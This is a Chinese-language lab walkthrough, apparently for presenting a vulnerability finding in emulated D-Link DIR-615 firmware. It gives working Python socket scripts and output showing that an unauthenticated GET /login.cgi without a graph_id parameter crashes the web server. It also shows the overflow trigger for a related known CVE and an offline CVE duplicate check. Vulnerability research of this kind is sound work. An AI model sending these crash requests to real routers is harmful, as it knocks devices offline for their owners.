## 阶段 2　起服务，做三对照（15 分钟，核心）

🐧 一条命令代跑（内部就是下面的手工步骤）：

```powershell
py -3 lab\walk2_probe.py
```

**你应该看到**（这是 2026-11-28 的实跑输出）：

```
== 对照组 A：正常页面应该活着 ==
  启动后进程: up
  GET /index.asp            → 6299 字节  HTTP/1.0 200 Ok  进程=up

== 对照组 B：带 graph_id 应该活着 ==
  GET /login.cgi?graph_id=1 → 6299 字节  HTTP/1.0 200 Ok  进程=up

== 触发：不带 graph_id ==
  第 1 次：GET /login.cgi → 0 字节  (空响应)  进程=down
  第 2 次：GET /login.cgi → 0 字节  (空响应)  进程=down
  第 3 次：GET /login.cgi → 0 字节  (空响应)  进程=down

== 结论 ==
  崩溃复现：未认证的 GET /login.cgi 使 Web 服务退出。
```

以及服务端日志里那一行：

```
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
```

**三个对照各自的作用**（汇报时按这个顺序讲）：

| 对照 | 排除什么 |
|---|---|
| A：`/index.asp` 200 | 证明服务本来活着，不是没起来 |
| B：`/login.cgi?graph_id=1` 200 | 证明这个端点本身正常，不是路由坏了 |
| 触发：`/login.cgi` 0 字节 + 进程 down | **只差一个参数，行为天差地别** |

## 阶段 3　自己手敲一遍（10 分钟）

不想依赖脚本的话，开两个终端。

**终端一：起服务**

```bash
sudo -i
pkill -9 -x httpd; sleep 1
chroot /home/ubuntu/lab/d615/root /sbin/httpd -h /www -p 80 > /tmp/httpd.log 2>&1 &
```

**终端二：先发带参数的**

```bash
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /login.cgi?graph_id=1 HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
d = b""
while True:
    c = s.recv(8192)
    if not c: break
    d += c
print(len(d), "字节；首行：", d.split(b"\r\n")[0])
PY
```

→ 应返回 **6299 字节、`HTTP/1.0 200 Ok`**。

**再发不带参数的**

```bash
python3 - <<'PY'
import socket
s = socket.create_connection(("127.0.0.1", 80), 5)
s.sendall(b"GET /login.cgi HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
print("收到：", s.recv(4096))
PY
```

→ 应返回 **`b''`（空）**。回终端一敲 `pgrep -x httpd` —— **没了**。

> 用 `pkill -x httpd` 而不是 `pkill -f 'sbin/httpd'`：
> 后者会匹配到**你自己这层 shell 的命令行**（脚本正文里就有这几个字），把自己杀掉。
> 我今天就踩了这个坑，表现是命令突然 `rc=137`、输出戛然而止。

## 阶段 4　一个必须记住的坑：0 字节 ≠ 崩溃

这一步是**汇报时最容易被问倒的地方**，先自己撞一次。

🐧 打完这个脚本：

```powershell
py -3 lab\walk5_cve_like.py
```

**你会看到**：

```
基线 GET  /ping_response.cgi  -> 1818 字节
POST ping_ipaddr=400×A        -> 0 字节 (空响应)
进程=up
```

**0 字节，但进程还活着。** 这就是为什么不能只看"有没有响应"：

| 现象 | 含意 |
|---|---|
| 0 字节 **且** 进程 down **且** 日志 SIGSEGV | 真的崩了（我们的 `/login.cgi`） |
| 0 字节 **但** 进程 up | 服务没答，但不等于死（可能是这个请求超时/被丢） |

所以工具里每条观测都同时记三样：**长度、判定、进程状态**。
汇报时如果有人问"你怎么知道不是超时"，就翻这一页。

> 顺带：`/ping_response.cgi` 返回 1818 字节，和之前文档里写的 1818 对上了 ——
> 但 `/index.asp` 读全了是 6299 字节。**1818 是单次 `recv` 的首包长度，不是完整正文。**
> 判定用的是"和 404 比像不像"，不受这个影响；但写报告时数字要统一口径。

## 阶段 5　跨版本：2015 年的固件还有没有这个接口（10 分钟）

🐧

```powershell
py -3 lab\walk4_dedup.py
```

会先列可用的 rootfs（`/home/ubuntu/lab/d615/root` 是 C2，`/home/ubuntu/fw/reve/root` 是 RevE），
然后跑查重 —— 注意查重那部分要在**宿主机**跑（见阶段 6），因为离线库不在 VM 上。

跨版本结论（已归档，见 `docs/漏洞报告-DIR-615-login-cgi-未认证崩溃.md` 4.5 节）：

| 版本 | 构建 | `login.cgi` | 结果 |
|---|---|---|---|
| C2 3.03 | 2010-10 | 存在 | **crash** |
| E4 3.08 | 2011-08 | 存在 | **crash** |
| A(A1A) 2.5.12 | 2015-05 | **404** | 不受影响 |

**这段怎么讲**：缺陷不是"所有 DIR-615 都中"，而是绑在 2010–2011 的旧 `.asp` 架构上；
2015 年重写成 busybox + 模板栈后，接口根本不存在了。**边界清楚比"全中"更有说服力。**

## 阶段 6　查重：这条到底有没有被人报过（10 分钟）

🖥️ **必须在宿主机跑** —— 离线库（259 MB）在 `C:\deepseek\fwmap-tool\data\nvd\`，
同步脚本是故意跳过它的。

```powershell
py -3 -m fwmap nvd status
```

```
[+] 库文件   ...\data\nvd\nvd.sqlite
    条数     423984 条 CVE
    构建于   2026-11-12 10:02:09
```

```powershell
py -3 -m fwmap nvd search "DIR-615"
```

**这里有个必须知道的邻居**：

```
CVE-2021-37388  CRITICAL 9.8  A buffer overflow in D-Link DIR-615 C2 3.03WW.
                The ping_ipaddr parameter in ping_response.cgi POST request
                allows an attacker to crash the webserver and might even gain RCE.
```

**同一个型号、同一个版本、同样是"把 Web 打崩"** —— 但**不是同一条**：

| | CVE-2021-37388 | 我们这条 |
|---|---|---|
| 端点 | `ping_response.cgi` | `login.cgi` |
| 触发 | POST **带**超长 `ping_ipaddr` | GET **不带** `graph_id` |
| 类型 | 缓冲区溢出 | 缺参数导致的空指针/异常路径 |
| 结果 | 崩溃，可能 RCE | 崩溃（DoS） |

汇报时**主动**说这一条，比被问出来强得多：

> "同型号有一条 CVE-2021-37388，是 `ping_response.cgi` 的缓冲区溢出。
> 我们这条是 `login.cgi` 缺参数，端点和触发方式都不同。
> 我们查了离线 NVD 42 万条，`DIR-615` 命中 6 条，逐条比对没有这一条。"

然后补一句诚实的：**在线渠道还没查全**（NVD 在线 / Exploit-DB / CNVD），
所以等级仍是 candidate。

## 附一　常见卡点

| 现象 | 原因 | 处理 |
|---|---|---|
| `端口没起来` | 上一轮 httpd 没退干净 | `pkill -9 -x httpd` |
| 全部 0 字节 | binfmt 没注册 | 装 `qemu-user-static` |
| `/login.cgi` 返回 404 | 拿错版本（2015 后的重构版没这个接口） | 换 C2/E4 的 rootfs |
| 命令 `rc=137` 且输出截断 | `pkill -f 'sbin/httpd'` 把自己杀了 | 改用 `pkill -x httpd` |
| 查重报"没有离线库" | 在 VM 上跑的 | 回宿主机跑 |

## 附三　给汇报用的一句话总结

> 一个不带参数的 GET 请求能让这台路由器的 Web 服务退出；带参数则完全正常。
> 两个固件版本都复现，2015 版接口已移除。
> 同型号有一条相邻 CVE（`ping_response.cgi` 溢出），但不是同一条；
> 离线库 42 万条无匹配。等级仍是 candidate —— 还差真机验证和厂商确认。
